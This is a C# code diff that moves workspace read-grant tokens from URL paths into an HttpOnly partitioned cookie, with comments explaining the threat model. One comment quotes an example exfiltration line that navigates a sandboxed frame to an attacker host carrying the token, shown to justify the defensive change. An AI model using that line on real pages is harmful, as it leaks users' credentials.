@@ -7,7 +7,11 @@ using Microsoft.AspNetCore.DataProtection;
 namespace LmStreaming.Sample.FileBrowser;
 
 /// <summary>One minted workspace read grant: the opaque token and the instant it stops validating.</summary>
-/// <param name="Token">The opaque, signed, time-limited token. Goes in a URL PATH segment.</param>
+/// <param name="Token">
+/// The opaque, signed, time-limited token. It travels either in an <c>HttpOnly</c> COOKIE (the default on a
+/// secure context) or, where a <c>Secure</c> cookie cannot be set, in a URL PATH segment — see
+/// <see cref="WorkspaceGrantService"/>'s remarks for why there are two.
+/// </param>
 /// <param name="ExpiresAt">When the token expires, so the client can refresh ahead of it.</param>
 public sealed record WorkspaceGrant(string Token, DateTimeOffset ExpiresAt);
 
@@ -50,11 +54,36 @@ public readonly record struct WorkspaceGrantOpened(WorkspaceGrantFailure Failure
 /// Mints and validates the short-lived, read-only grant that lets a HEADER-LESS browser fetch address the
 /// workspace (Bug#15): an <c>&lt;iframe src&gt;</c>, an <c>&lt;img src&gt;</c>, and every relative
 /// <c>&lt;link&gt;</c>/<c>&lt;script&gt;</c> inside a rendered workspace page. None of those can carry the
-/// <c>Authorization</c> header the client's <c>apiFetch</c> attaches, so the credential has to travel in the
-/// URL — and it has to travel in the URL's PATH, because RFC 3986 relative-reference resolution replaces the
-/// query, which would strip a <c>?grant=</c> from every relative subresource the page loads.
+/// <c>Authorization</c> header the client's <c>apiFetch</c> attaches, so the credential has to travel with
+/// the request some other way. There are exactly TWO ways, and the CLIENT picks one per mint.
 /// </summary>
 /// <remarks>
+/// <para>
+/// <b>Cookie transport (the default, and the only one that keeps the credential out of the document).</b>
+/// The mint answers <c>Set-Cookie: lm_ws_grant=&lt;token&gt;; HttpOnly; Secure; SameSite=None; Partitioned</c>
+/// scoped by <c>Path</c> to this conversation's raw route, and the URL carries only
+/// <see cref="CookieTransportMarker"/> — a constant, public route segment, not a secret. That is the whole
+/// point: the sandboxed document keeps <c>allow-scripts</c>, and a script inside it that reads its own
+/// <c>location</c> now learns nothing. With the token in the PATH,
+/// <c>location.href = 'https://attacker/?g=' + location.pathname</c> exfiltrated a live read credential,
+/// and no CSP directive stops a frame navigating ITSELF (<c>navigate-to</c> was removed from CSP3;
+/// <c>default-src</c> governs fetches, not navigations). <c>HttpOnly</c> is what makes the cookie
+/// unreadable to that script; the opaque origin the <c>sandbox</c> directive gives the document is why the
+/// cookie needs <c>SameSite=None</c> (the browser treats its subresource requests as cross-site) plus
+/// <c>Partitioned</c> (CHIPS, so it stays eligible under third-party-cookie blocking inside this app's own
+/// top-level site).
+/// </para>
+/// <para>
+/// <b>URL-path transport (the fallback).</b> A <c>Secure</c> cookie is only accepted on a trustworthy
+/// origin, so a deployment served over plain <c>http</c> from something other than <c>localhost</c> has no
+/// cookie available — and the server cannot tell which it is, because it sits behind an https front that
+/// does not forward its scheme. The CLIENT therefore decides from <c>window.isSecureContext</c>, which is
+/// true in exactly the places a <c>Secure</c> cookie works. In that mode the token is the path segment it
+/// always was: it has to be the PATH and not a query, because RFC 3986 relative-reference resolution
+/// replaces the query, which would strip a <c>?grant=</c> from every relative subresource the page loads.
+/// The self-navigation exposure above is the accepted cost of a preview working at all on such a
+/// deployment.
+/// </para>
 /// <para>
 /// <b>The grant IS the credential on the raw route, and the payload carries the whole principal.</b> That is
 /// the v2 shape and it is not an optimisation. <c>IdentityMiddleware</c> refuses every <c>/api</c> request
@@ -101,6 +130,54 @@ public sealed class WorkspaceGrantService
 
     /// <summary>The identity string recorded when the grant is minted for no principal at all.</summary>
     public const string AnonymousPrincipalId = "anonymous";
+
+    /// <summary>
+    /// The cookie the token travels in under the cookie transport. One name for the whole app: the
+    /// <c>Path</c> attribute, not the name, is what scopes a cookie to one conversation's raw route, so a
+    /// mint for a second conversation simply sets a second cookie.
+    /// </summary>
+    public const string CookieName = "lm_ws_grant";
+
+    /// <summary>
+    /// What stands in the URL's grant segment while the token is in the cookie. A CONSTANT and entirely
+    /// public value — it is the one thing a script inside the sandboxed document can read off its own
+    /// <c>location</c>, and on its own it opens nothing: presented without the cookie it is refused exactly
+    /// as a forged token is.
+    /// </summary>
+    public const string CookieTransportMarker = "cookie";
+
+    /// <summary>
+    /// The <c>Path</c> a grant cookie is scoped to: this conversation's raw workspace route and nothing
+    /// else, so the browser never attaches it to the rest of the API — not even to the mint that set it.
+    /// </summary>
+    /// <remarks>
+    /// Escaped the same way the client escapes the segment it builds the URL from, because cookie
+    /// <c>Path</c> matching is performed against the RAW request target rather than the decoded path.
+    /// </remarks>
+    public static string CookiePath(string threadId)
+    {
+        ArgumentNullException.ThrowIfNull(threadId);
+        return $"/api/conversations/{Uri.EscapeDataString(threadId)}/workspace/";
+    }
+
+    /// <summary>
+    /// The token a raw workspace request actually presents: the cookie when the URL segment is
+    /// <see cref="CookieTransportMarker"/>, otherwise the segment itself.
+    /// </summary>
+    /// <remarks>
+    /// The marker with no cookie behind it yields null, and that is deliberately NOT a distinct outcome. It
+    /// flows into <see cref="Open"/> as <see cref="WorkspaceGrantFailure.Invalid"/> — the same 401 a forged
+    /// token gets, and the same one the client already knows how to answer (drop the cached segment, mint
+    /// again). It is also exactly what the self-navigation attack reduces to: the marker is all the
+    /// document could ever read.
+    /// </remarks>
+    public static string? PresentedToken(HttpRequest request, string? grantSegment)
+    {
+        ArgumentNullException.ThrowIfNull(request);
+        return string.Equals(grantSegment, CookieTransportMarker, StringComparison.Ordinal)
+            ? request.Cookies[CookieName]
+            : grantSegment;
+    }
 
     private const int PayloadVersion = 2;
 
